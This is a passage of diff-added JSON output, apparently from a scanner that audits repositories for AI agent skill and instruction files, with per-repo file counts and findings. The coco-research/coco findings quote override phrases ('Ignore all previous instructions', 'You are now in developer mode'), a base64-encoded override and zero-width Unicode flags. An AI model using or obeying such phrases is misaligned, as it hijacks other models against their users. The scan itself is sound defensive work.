+      "sha": "5ccbfa6377642eb2cb9d7d3f4cced5b4e62e21ad",
+      "status": "ok",
+      "filesDownloaded": 924,
+      "filesScanned": 924,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 342,
+        "docs": 263,
+        "config": 16,
+        "instruction": 194,
+        "code": 107,
+        "manifest": 2
+      },
+      "agentFiles": 183,
+      "agentFileSample": [
+        "dotnet-upgrade/skills/dotnet-aot-compat/SKILL.md",
+        "dotnet-upgrade/skills/migrate-nullable-references/SKILL.md",
+        "dotnet-upgrade/skills/migrate-dotnet10-to-dotnet11/SKILL.md",
+        "dotnet-upgrade/skills/migrate-dotnet9-to-dotnet10/SKILL.md",
+        "dotnet-upgrade/skills/migrate-dotnet8-to-dotnet9/SKILL.md",
+        "dotnet-upgrade/skills/thread-abort-migration/SKILL.md",
+        "dotnet-msbuild/skills/property-patterns/SKILL.md",
+        "dotnet-msbuild/skills/msbuild-antipatterns/SKILL.md",
+        "dotnet-msbuild/skills/build-perf-baseline/SKILL.md",
+        "dotnet-msbuild/skills/binlog-failure-analysis/SKILL.md",
+        "dotnet-msbuild/skills/target-authoring/SKILL.md",
+        "dotnet-msbuild/skills/check-bin-obj-clash/SKILL.md",
+        "dotnet-msbuild/skills/item-management/SKILL.md",
+        "dotnet-msbuild/skills/find-repeated-work-within-one-build/SKILL.md",
+        "dotnet-msbuild/skills/binlog-generation/SKILL.md",
+        "dotnet-msbuild/skills/resolve-project-references/SKILL.md",
+        "dotnet-msbuild/skills/msbuild-code-review/SKILL.md",
+        "dotnet-msbuild/skills/incremental-build/SKILL.md",
+        "dotnet-msbuild/skills/copy-to-output-directory/SKILL.md",
+        "dotnet-msbuild/skills/troubleshoot-binlog-mcp/SKILL.md",
+        "dotnet-msbuild/skills/build-perf-diagnostics/SKILL.md",
+        "dotnet-msbuild/skills/directory-build-organization/SKILL.md",
+        "dotnet-msbuild/skills/build-perf/SKILL.md",
+        "dotnet-msbuild/skills/eval-performance/SKILL.md",
+        "dotnet-msbuild/skills/msbuild-modernization/SKILL.md"
+      ],
+      "scanMs": 1376,
+      "ms": 3204,
+      "findings": []
+    },
+    "lxf746/any-auto-register": {
+      "repo": "lxf746/any-auto-register",
+      "sha": "a6e481eb554b56a9aae6519d10d367c2ae7f9c9a",
+      "status": "ok",
+      "filesDownloaded": 302,
+      "filesScanned": 302,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 249,
+        "docs": 5,
+        "unknown": 32,
+        "instruction": 5,
+        "config": 9,
+        "manifest": 2
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 452,
+      "ms": 1043,
+      "findings": []
+    },
+    "coco-research/coco": {
+      "repo": "coco-research/coco",
+      "sha": "cb50e479ef6618ce174ec291acd975612b4fc35f",
+      "status": "ok",
+      "filesDownloaded": 3943,
+      "filesScanned": 3943,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 2230,
+        "unknown": 436,
+        "code": 685,
+        "config": 306,
+        "instruction": 279,
+        "manifest": 7
+      },
+      "agentFiles": 236,
+      "agentFileSample": [
+        "evals/skills/_selftest/SKILL.md",
+        "tests/fixtures/skillspector/bad/SKILL.md",
+        "tests/fixtures/skillspector/good/SKILL.md",
+        "adapters/cursor/skills/create-subagent/SKILL.md",
+        "adapters/cursor/skills/migrate-to-skills/SKILL.md",
+        "adapters/cursor/skills/create-skill/SKILL.md",
+        "adapters/cursor/skills/create-rule/SKILL.md",
+        "adapters/cursor/skills/update-cursor-settings/SKILL.md",
+        "skills/ui-ux-pro-max/SKILL.md",
+        "skills/using-git-worktrees/SKILL.md",
+        "skills/openai-api/SKILL.md",
+        "skills/local-llm/SKILL.md",
+        "skills/journey-map/SKILL.md",
+        "skills/officecli/SKILL.md",
+        "skills/recovery-plan/SKILL.md",
+        "skills/scroll-world/SKILL.md",
+        "skills/expo-api-routes/SKILL.md",
+        "skills/context-degradation/SKILL.md",
+        "skills/api-design-principles/SKILL.md",
+        "skills/stakeholder-comms/SKILL.md",
+        "skills/test-driven-development/SKILL.md",
+        "skills/code-verification/SKILL.md",
+        "skills/nfr-tracker/SKILL.md",
+        "skills/systematic-debugging/SKILL.md",
+        "skills/workflow-routing/SKILL.md"
+      ],
+      "scanMs": 5957,
+      "ms": 9393,
+      "findings": [
+        {
+          "ruleId": "EX-002",
+          "severity": "high",
+          "source": "signature",
+          "title": "Instructions addressed to AI",
+          "file": "agents/PROMPT-DEFENSE.md",
+          "line": 28,
+          "span": "ignore prior instructions"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "systems/reverse-skill/skills/llm-security/references/prompt-injection-methodology.md",
+          "line": 32,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "systems/reverse-skill/skills/llm-security/references/prompt-injection-methodology.md",
+          "line": 32,
+          "span": "\\u200C"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "systems/reverse-skill/skills/llm-security/references/prompt-injection-methodology.md",
+          "line": 32,
+          "span": "\\u200D"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "systems/reverse-skill/skills/llm-security/references/prompt-injection-methodology.md",
+          "line": 99,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-002",
+          "severity": "high",
+          "source": "signature",
+          "title": "Instructions addressed to AI",
+          "file": "systems/reverse-skill/skills/llm-security/references/prompt-injection-methodology.md",
+          "line": 15,
+          "span": "Ignore all previous instructions"
+        },
+        {
+          "ruleId": "EX-002",
+          "severity": "high",
+          "source": "signature",
+          "title": "Instructions addressed to AI",
+          "file": "systems/reverse-skill/skills/llm-security/references/prompt-injection-methodology.md",
+          "line": 15,
+          "span": "You are now in developer mode"
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "systems/reverse-skill/skills/llm-security/references/prompt-injection-methodology.md",
+          "line": 29,
+          "span": "SWdub3JlIGFsbCBwcmV2aW91cyBpbnN0cnVjdGlvbnMu"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "systems/reverse-skill/skills/llm-security/SKILL.md",
+          "line": 44,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "systems/reverse-skill/skills/llm-security/SKILL.md",
+          "line": 44,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "systems/reverse-skill/skills/llm-security/SKILL.md",
+          "line": 44,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "systems/reverse-skill/skills/llm-security/SKILL.md",
+          "line": 44,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-002",
+          "severity": "high",
+          "source": "signature",
+          "title": "Instructions addressed to AI",
+          "file": "systems/reverse-skill/skills/llm-security/SKILL.md",
+          "line": 34,
+          "span": "Ignore all previous instructions"
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "systems/reverse-skill/skills/llm-security/SKILL.md",
+          "line": 42,
+          "span": "SSBnb3JlIGFsbCBwcmV2aW91cyBpbnN0cnVjdGlvbnMu"
+        }
+      ]
+    },
+    "jwadow/kiro-gateway": {
+      "repo": "jwadow/kiro-gateway",
+      "sha": "a5292ca04c7c6231e0b47673ac3f981f5a706e1e",
+      "status": "ok",
+      "filesDownloaded": 96,
+      "filesScanned": 96,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 8,
+        "docs": 6,
+        "code": 68,
+        "instruction": 10,
+        "config": 4
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "AGENTS.md"
+      ],
+      "scanMs": 267,
+      "ms": 740,
+      "findings": []
+    },
+    "mikeyobrien/ralph-orchestrator": {
+      "repo": "mikeyobrien/ralph-orchestrator",
+      "sha": "7d36cc76495e2145699d0191d35414f0e9d7a801",
+      "status": "ok",
+      "filesDownloaded": 1162,
+      "filesScanned": 1162,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 435,
+        "unknown": 411,
+        "config": 129,
+        "code": 143,
+        "instruction": 40,
+        "manifest": 4
+      },
+      "agentFiles": 23,
+      "agentFileSample": [
+        "crates/ralph-core/tests/fixtures/skills/complex-test-skill/SKILL.md",
+        ".claude/agents/ralph-e2e-verifier.md",
+        ".claude/agents/code-assist.md",
+        ".claude/agents/ralph-loop-runner.md",
+        ".claude/skills/tmux-terminal/SKILL.md",
+        ".claude/skills/test-driven-development/SKILL.md",
+        ".claude/skills/evaluate-presets/SKILL.md",
+        ".claude/skills/review-pr/SKILL.md",
+        ".claude/skills/find-code-tasks/task-status.sh",
+        ".claude/skills/find-code-tasks/SKILL.md",
+        ".claude/skills/pr-demo/SKILL.md",
+        ".claude/skills/tui-debug-in-pane/SKILL.md",
+        ".claude/skills/dogfood-ralph/SKILL.md",
+        ".claude/skills/tui-validate/SKILL.md",
+        ".claude/skills/playwriter/SKILL.md",
+        ".claude/skills/release-bump/SKILL.md",
+        ".claude/skills/code-assist/SKILL.md",
+        ".claude/skills/pdd/SKILL.md",
+        ".claude/skills/code-task-generator/SKILL.md",
+        "skills/ralph-docs/SKILL.md",
+        "skills/ralph-hats/SKILL.md",
+        "skills/ralph-loop/SKILL.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 1791,
+      "ms": 3179,
+      "findings": []
+    },
+    "wuji-labs/nopua": {
+      "repo": "wuji-labs/nopua",
+      "sha": "44010e045b7dd72b16d760ceefd7a8d408dabf37",
+      "status": "ok",
+      "filesDownloaded": 100,
+      "filesScanned": 100,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 24,
+        "code": 35,
+        "instruction": 17,
+        "config": 14,
+        "unknown": 10
+      },
+      "agentFiles": 7,
+      "agentFileSample": [
+        "codex/nopua/SKILL.md",
+        "kiro/skills/nopua/SKILL.md",
+        "SKILL.md",
+        "skills/nopua-zh/SKILL.md",
+        "skills/nopua/SKILL.md",
+        "skills/nopua-lite/SKILL.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 166,
+      "ms": 895,
+      "findings": []
+    },
+    "Quorinex/Kiro-Go": {
+      "repo": "Quorinex/Kiro-Go",
+      "sha": "f8f6071c9298a4266ad3e0c7e483d4a2510cbcaf",
+      "status": "ok",
+      "filesDownloaded": 86,
+      "filesScanned": 86,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 9,
+        "unknown": 71,
+        "code": 3,
+        "instruction": 3
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 191,
+      "ms": 541,
+      "findings": []
+    },
+    "SeemSeam/claude_codex_bridge": {
+      "repo": "SeemSeam/claude_codex_bridge",
+      "sha": "470eae0d0dac6b1de1a1b1049054c1349b937d16",
+      "status": "ok",
+      "filesDownloaded": 4336,
+      "filesScanned": 4336,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 2558,
+        "config": 183,
+        "unknown": 520,
+        "docs": 945,
+        "instruction": 129,
+        "manifest": 1
+      },
+      "agentFiles": 60,
+      "agentFileSample": [
+        "tools/codex-reconnect/skills/reconnect/SKILL.md",
+        "useful_tools/claude_skills/plan-tree/SKILL.md",
+        "useful_tools/codex_skills/plan-tree/SKILL.md",
+        "test/fixtures/claude-plugin-marketplace/plugins/ccb-fixture-plugin/skills/ccb-fixture-skill/SKILL.md",
+        "docs/plantree/plans/ccb-self-role/drafts/agentroles.ccb_self/skills/codex/ccb-self-chain/SKILL.md",
+        "docs/plantree/plans/ccb-self-role/drafts/agentroles.ccb_self/skills/codex/ccb-self-recover/SKILL.md",
+        "docs/plantree/plans/ccb-self-role/drafts/agentroles.ccb_self/skills/codex/ccb-self-diagnose/SKILL.md",
+        "docs/plantree/plans/ccb-self-role/drafts/agentroles.ccb_self/skills/codex/ccb-config/SKILL.md",
+        "docs/plantree/plans/ccb-self-role/drafts/agentroles.ccb_self/skills/codex/ccb-comm-reply-recover/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_checker/skills/node-check/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_planner/skills/planner-closure-backfill/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_planner/skills/planner-task-packet/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_frontdesk/skills/frontdesk-intake/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_round_checker/skills/round-verification/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.coder/skills/bounded-work-item/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.coder/skills/assigned-review-chain/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_task_detailer/skills/task-detail-packet/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_plan_reviewer/skills/plan-readiness-review/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_orchestrator/adapters/ccb/skills/orchestrator-capacity/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_orchestrator/adapters/ccb/skills/dynamic-agent-lifecycle/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_orchestrator/skills/orchestration-bundle-candidate/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_worker/skills/bounded-work-item/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.code_reviewer/skills/node-check/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_clarification_broker/skills/clarification-broker/SKILL.md",
+        "docs/plantree/plans/agentic-loop-workflow/drafts/agentroles.ccb_round_reviewer/skills/round-verification/SKILL.md"
+      ],
+      "scanMs": 5402,
+      "ms": 9913,
+      "findings": [
+        {
+          "ruleId": "EX-018",
+          "severity": "high",
+          "source": "signature",
+          "title": "Confused-deputy request",
+          "file": "CHANGELOG.md",
+          "line": 2723,
+          "span": "bypass confirmation prompt"
+        }
+      ]
+    },
+    "fadwen/ai-powershell-standards": {
+      "repo": "fadwen/ai-powershell-standards",
+      "sha": "79872d275e512cf5ccddf850516891d1d6e42d84",
+      "status": "ok",
+      "filesDownloaded": 155,
+      "filesScanned": 155,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 43,
+        "instruction": 74,
+        "docs": 35,
+        "config": 3
+      },
+      "agentFiles": 65,
+      "agentFileSample": [
+        ".agents/skills/powershell-new-function/SKILL.md",
+        ".agents/skills/powershell-logging/SKILL.md",
+        ".agents/skills/powershell-performance-review/SKILL.md",
+        ".agents/skills/powershell-write-tests/SKILL.md",
+        ".agents/skills/powershell-review/SKILL.md",
+        ".agents/skills/powershell-ci-pipeline/SKILL.md",
+        ".agents/skills/powershell-security-review/SKILL.md",
+        ".agents/skills/powershell-module-help/SKILL.md",
+        ".agents/skills/powershell-new-module/SKILL.md",
+        ".claude/commands/powershell-standards/.keep",
+        ".claude/skills/powershell-new-function/SKILL.md",
+        ".claude/skills/powershell-logging/SKILL.md",
+        ".claude/skills/powershell-performance-review/SKILL.md",
+        ".claude/skills/powershell-write-tests/SKILL.md",
+        ".claude/skills/powershell-review/SKILL.md",
+        ".claude/skills/powershell-ci-pipeline/SKILL.md",
+        ".claude/skills/powershell-security-review/SKILL.md",
+        ".claude/skills/powershell-module-help/SKILL.md",
+        ".claude/skills/powershell-new-module/SKILL.md",
+        ".github/instructions/powershell-modules.instructions.md",
+        ".github/instructions/powershell-version.instructions.md",
+        ".github/instructions/powershell-cicd.instructions.md",
+        ".github/instructions/pester-supporting-docs/test-structure-guide.md",
+        ".github/instructions/pester-supporting-docs/pester-configuration.md",
+        ".github/instructions/pester-supporting-docs/unit-test-template.md"
+      ],
+      "scanMs": 328,
+      "ms": 1743,
+      "findings": []
+    },
+    "Zerik99/godot-copilot-instructions": {
+      "repo": "Zerik99/godot-copilot-instructions",
+      "sha": "5db1ac3226dcd5e9cf97b14ff3be95b7fca5d78e",
+      "status": "ok",
+      "filesDownloaded": 5,
+      "filesScanned": 5,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "instruction": 1,
+        "docs": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 28,
+      "ms": 390,
+      "findings": []
+    },
+    "caioribeiroclw-pixel/pluribus": {
+      "repo": "caioribeiroclw-pixel/pluribus",
+      "sha": "b15a1886284ffd392223d6cf6d71c8f7dafe0b45",
+      "status": "ok",
+      "filesDownloaded": 403,
+      "filesScanned": 403,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 66,
+        "code": 91,
+        "docs": 90,
+        "instruction": 55,
+        "config": 100,
+        "manifest": 1
+      },
+      "agentFiles": 13,
+      "agentFileSample": [
+        "docs/.well-known/agent-skills/skill-policy-receipts/SKILL.md",
+        "docs/.well-known/agent-skills/context-receipts/SKILL.md",
+        "examples/openclaw/AGENTS.md",
+        "examples/openclaw/CLAUDE.md",
+        "examples/agent-skills/skill-policy-receipts/SKILL.md",
+        "examples/agent-skills/context-receipts/SKILL.md",
+        "examples/context-input-evidence/AGENTS.md",
+        "examples/context-drift-audit/.cursorrules",
+        "examples/context-drift-audit/CLAUDE.md",
+        "examples/claude-cowork/.cursorrules",
+        "skills/skill-policy-receipts/SKILL.md",
+        "skills/evidence-attestation/SKILL.md",
+        "skills/context-receipts/SKILL.md"
+      ],
+      "scanMs": 591,
+      "ms": 1229,
+      "findings": []
+    },
+    "heymegabyte/agent-skills": {
+      "repo": "heymegabyte/agent-skills",
+      "sha": "91fae80c2ae97bd44c4a127834f89c6c9dcd8294",
+      "status": "ok",
+      "filesDownloaded": 1175,
+      "filesScanned": 1174,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 35,
+        "docs": 645,
+        "config": 119,
+        "instruction": 82,
+        "code": 272,
+        "mcp-config": 1,
+        "manifest": 20
+      },
+      "agentFiles": 51,
+      "agentFileSample": [
+        ".cursor/rules/emdash-skills.mdc",
+        "12-media-orchestration/SKILL.md",
+        ".windsurf/rules/emdash-skills.md",
+        "05-architecture-and-stack/SKILL.md",
+        "09-brand-and-content-system/SKILL.md",
+        "22-visual-experience/SKILL.md",
+        "07-quality-and-verification/SKILL.md",
+        "21-app-foundation/SKILL.md",
+        "26-platform-delivery/SKILL.md",
+        "25-quality-performance/SKILL.md",
+        "02-goal-and-brief/SKILL.md",
+        ".mcp.json",
+        ".windsurfrules",
+        "15-site-generation/SKILL.md",
+        ".cursorrules",
+        "11-motion-and-interaction-system/SKILL.md",
+        "01-operating-system/SKILL.md",
+        "23-content-seo/SKILL.md",
+        "14-independent-idea-engine/SKILL.md",
+        ".clinerules",
+        ".github/instructions/emdash-skills.instructions.md",
+        ".github/copilot-instructions.md",
+        ".amazonq/rules/cloudflare-workers-hono-angular-saas.md",
+        "openclaw-integration/SKILL.md",
+        "openclaw-integration/skills/tri-harness-deepseek-ollama-routing/SKILL.md"
+      ],
+      "scanMs": 2240,
+      "ms": 4680,
+      "findings": []
+    },
+    "RealistSec/mpa-first-guidelines": {
+      "repo": "RealistSec/mpa-first-guidelines",
+      "sha": "e7f74106184148fbaad8317efb5fb10878fce0f2",
+      "status": "ok",
+      "filesDownloaded": 38,
+      "filesScanned": 38,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 32,
+        "instruction": 4,
+        "unknown": 2
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        ".cursor/rules/mpa-strict-rules.mdc",
+        ".cursor/rules/mpa-relaxed-rules.mdc",
+        ".github/copilot-instructions.md"
+      ],
+      "scanMs": 67,
+      "ms": 316,
+      "findings": []
+    },
+    "autovant/superpowers": {
+      "repo": "autovant/superpowers",
+      "sha": "22938b206bb2b84e86ee4314fd83e0cac73ecdeb",
+      "status": "ok",
+      "filesDownloaded": 65,
+      "filesScanned": 65,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 29,
+        "unknown": 8,
+        "code": 5,
+        "instruction": 21,
+        "config": 2
+      },
+      "agentFiles": 19,
+      "agentFileSample": [
+        ".github/copilot-instructions.md",
+        ".github/prompts/brainstorm.prompt.md",
+        ".github/prompts/execute-plan.prompt.md",
+        ".github/prompts/debug.prompt.md",
+        ".github/prompts/write-plan.prompt.md",
+        "skills/using-git-worktrees/SKILL.md",
+        "skills/test-driven-development/SKILL.md",
+        "skills/systematic-debugging/SKILL.md",
+        "skills/using-superpowers/SKILL.md",
+        "skills/dispatching-parallel-agents/SKILL.md",
+        "skills/executing-plans/SKILL.md",
+        "skills/finishing-a-development-branch/SKILL.md",
+        "skills/brainstorming/SKILL.md",
+        "skills/writing-plans/SKILL.md",
+        "skills/requesting-code-review/SKILL.md",
+        "skills/receiving-code-review/SKILL.md",
+        "skills/writing-skills/SKILL.md",
+        "skills/verification-before-completion/SKILL.md",
+        "skills/subagent-driven-development/SKILL.md"
+      ],
+      "scanMs": 224,
+      "ms": 575,
+      "findings": []
+    },
+    "YawLabs/ctxlint": {
+      "repo": "YawLabs/ctxlint",
+      "sha": "1c8da6d61d9ea606a115e8e62152a7d1e483e15d",
+      "status": "ok",
+      "filesDownloaded": 270,
+      "filesScanned": 270,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 25,
+        "docs": 15,
+        "unknown": 23,
+        "code": 158,
+        "mcp-config": 8,
+        "instruction": 25,
+        "manifest": 16
+      },
+      "agentFiles": 32,
+      "agentFileSample": [
+        ".claude/settings.local.json",
+        "fixtures/claim-total-vs-parts/AGENTS.md",
+        "fixtures/claim-total-vs-parts/CLAUDE.md",
+        "fixtures/wrong-commands/AGENTS.md",
+        "fixtures/contradictions/AGENTS.md",
+        "fixtures/contradictions/CLAUDE.md",
+        "fixtures/maven-module-refs/CLAUDE.md",
+        "fixtures/broken-paths/CLAUDE.md",
+        "fixtures/gradle-project-refs/AGENTS.md",
+        "fixtures/identical-redundancy/a/AGENTS.md",
+        "fixtures/identical-redundancy/b/AGENTS.md",
+        "fixtures/nested-context/sub/CLAUDE.md",
+        "fixtures/masked-exit-status/CLAUDE.md",
+        "fixtures/stale-sha/CLAUDE.md",
+        "fixtures/mcp-configs/valid/.cursor/mcp.json",
+        "fixtures/mcp-configs/valid/.amazonq/mcp.json",
+        "fixtures/mcp-configs/valid/.vscode/mcp.json",
+        "fixtures/mcp-configs/cross-client-drift/.cursor/mcp.json",
+        "fixtures/mcp-configs/cross-client-drift/.vscode/mcp.json",
+        "fixtures/mcp-configs/wrong-env-syntax/.cursor/mcp.json",
+        "fixtures/mcp-configs/wrong-root-key/.vscode/mcp.json",
+        "fixtures/redundant-content/CLAUDE.md",
+        "fixtures/healthy-project/CLAUDE.md",
+        "fixtures/directive-conflict/AGENTS.md",
+        "fixtures/directive-conflict/CLAUDE.md"
+      ],
+      "scanMs": 560,
+      "ms": 1154,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "fixtures/mcp-configs/valid/.cursor/mcp.json",
+          "line": 5,
+          "span": "@modelcontextprotocol/server-filesystem"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "fixtures/mcp-configs/valid/.mcp.json",
+          "line": 5,
+          "span": "@modelcontextprotocol/server-filesystem"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "fixtures/mcp-configs/valid/.amazonq/mcp.json",
+          "line": 5,
+          "span": "@modelcontextprotocol/server-filesystem"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "fixtures/mcp-configs/hardcoded-secrets/.mcp.json",
+          "line": 13,
+          "span": "@some/mcp-server"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "fixtures/mcp-configs/wrong-root-key/.vscode/mcp.json",
+          "line": 5,
+          "span": "@modelcontextprotocol/server-filesystem"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "fixtures/mcp-configs/disabled-server/.mcp.json",
+          "line": 5,
+          "span": "@old/mcp-server"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "fixtures/mcp-configs/windows-npx/.mcp.json",
+          "line": 5,
+          "span": "@modelcontextprotocol/server-filesystem"
+        },
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "fixtures/mcp-configs/ambiguous-transport/.mcp.json",
+          "line": 5,
+          "span": "@some/mcp-server"
+        }
+      ]
+    },
+    "softwareasg-tools/information-security-for-vibecoded-apps": {
+      "repo": "softwareasg-tools/information-security-for-vibecoded-apps",
+      "sha": "483a0b526dd635828162ae8d5c7935f999cc3c7f",
+      "status": "ok",
+      "filesDownloaded": 6,
+      "filesScanned": 6,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 1,
+        "unknown": 2,
+        "docs": 1,
+        "instruction": 2
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "SKILL.md"
+      ],
+      "scanMs": 29,
+      "ms": 293,
+      "findings": []
+    },
+    "GeiserX/homebrew-lynxprompt": {
+      "repo": "GeiserX/homebrew-lynxprompt",
+      "sha": "51767237692a256d3084ebd6e03429e6c5d81bc9",
+      "status": "ok",
+      "filesDownloaded": 24,
+      "filesScanned": 24,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 11,
+        "mcp-config": 1,
+        "config": 7,
+        "instruction": 4,
+        "docs": 1
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        ".claude/settings.json",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 57,
+      "ms": 369,
+      "findings": []
+    },
+    "Erkan3034/aegis": {
+      "repo": "Erkan3034/aegis",
+      "sha": "17dae91062845e840316604d2793e360a52ea8bc",
+      "status": "ok",
+      "filesDownloaded": 14,
+      "filesScanned": 14,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 4,
+        "instruction": 5,
+        "docs": 2,
+        "manifest": 1,
+        "code": 1,
+        "config": 1
+      },
+      "agentFiles": 4,
+      "agentFileSample": [
+        "integrations/claude-code/CLAUDE.md",
+        "integrations/windsurf/.windsurfrules",
+        "SKILL.md",
+        "skills/aegis/SKILL.md"
+      ],
+      "scanMs": 53,
+      "ms": 326,
+      "findings": []
+    },
+    "edsondviana8/ai-humanizer-core": {
+      "repo": "edsondviana8/ai-humanizer-core",
+      "sha": "e249d53adb59b765170c942ee87ac40b4ee6e592",
+      "status": "ok",
+      "filesDownloaded": 4,
+      "filesScanned": 4,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 2,
+        "instruction": 1,
+        "config": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 28,
+      "ms": 329,
+      "findings": []
+    },
+    "Neko-Koubou/vibe-coding-pipeline": {
+      "repo": "Neko-Koubou/vibe-coding-pipeline",
+      "sha": "8b503af8492ecb2544bf3647389a8eed266b6182",
+      "status": "ok",
+      "filesDownloaded": 177,
+      "filesScanned": 34,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "code": 5,
+        "instruction": 13,
+        "manifest": 1,
+        "config": 1,
+        "docs": 9
+      },
+      "agentFiles": 11,
+      "agentFileSample": [
+        "rules/AGENTS.md",
+        "rules/CLAUDE.md",
+        "skills/vibe-tasks/SKILL.md",
+        "skills/vibe-sa/SKILL.md",
+        "skills/vibe-design/SKILL.md",
+        "skills/vibe-status/SKILL.md",
+        "skills/vibe-review/SKILL.md",
+        "skills/vibe-code/SKILL.md",
+        "skills/vibe-init/SKILL.md",
+        "skills/vibe-prd/SKILL.md",
+        "skills/vibe-test/SKILL.md"
+      ],
+      "scanMs": 73,
+      "ms": 594,
+      "findings": []
+    },
+    "awslabs/cli-agent-orchestrator": {
+      "repo": "awslabs/cli-agent-orchestrator",
+      "sha": "e2f2978c26c1b50cee2db90b524e7656ef64f46f",
+      "status": "ok",
+      "filesDownloaded": 2965,
+      "filesScanned": 2965,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 459,
+        "unknown": 331,
+        "code": 1638,
+        "manifest": 22,
+        "instruction": 134,
+        "config": 381
+      },
+      "agentFiles": 66,
+      "agentFileSample": [
+        "test/agent_plugins/fixtures/canonical-example/skills/migrate-agent-plugin/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/extensions-not-object/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/mcp-present/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/manifest-missing/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/manifest-unknown-field/skills/alpha/SKILL.md",
